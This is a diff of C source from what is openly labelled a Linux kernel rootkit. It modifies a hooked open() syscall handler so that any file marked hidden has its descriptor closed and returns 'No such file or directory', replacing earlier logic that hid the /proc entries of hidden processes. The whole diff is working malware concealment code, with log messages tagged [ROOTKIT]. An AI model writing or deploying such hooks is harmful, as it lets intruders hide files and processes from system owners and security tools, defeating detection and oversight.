@@ -16,7 +16,6 @@ SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, 
     long l_ret               = 0;    // Return value of the real syscall
     const char *s_filename_k = NULL; // Name of the file
     const file_t *p_file     = NULL; // File structure representing what was opened
-    pid_t i32_found_pid      = -1;   // PID of the process found in the path, if any
 
     l_ret = orig_open(p_regs);
 
@@ -39,22 +38,13 @@ SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, 
         pr_err("[ROOTKIT] * Could not get file structure\n");
     }
     else {
-        IF_U (is_process_file(p_file, NULL, &i32_found_pid)) {
-            pr_info("[ROOTKIT] * Opened file is a process file\n");
-            pr_info("[ROOTKIT]   * PID: %d\n", i32_found_pid);
+        IF_U (is_file_hidden(p_file)) {
+            pr_info("[ROOTKIT]   * Hiding file\n");
 
-            // Check if the process is hidden; if so, hide the file
-            IF_U (is_pid_hidden(i32_found_pid)) {
-                pr_info("[ROOTKIT]   * Hiding process file\n");
+            // Close the file descriptor
+            close_fd(l_ret);
 
-                // Close the file descriptor
-                close_fd(l_ret);
-
-                return -ENOENT; // No such file or directory
-            }
-        }
-        else {
-            pr_info("[ROOTKIT] * Opened file is not a process file\n");
+            return -ENOENT; // No such file or directory
         }
     }
 
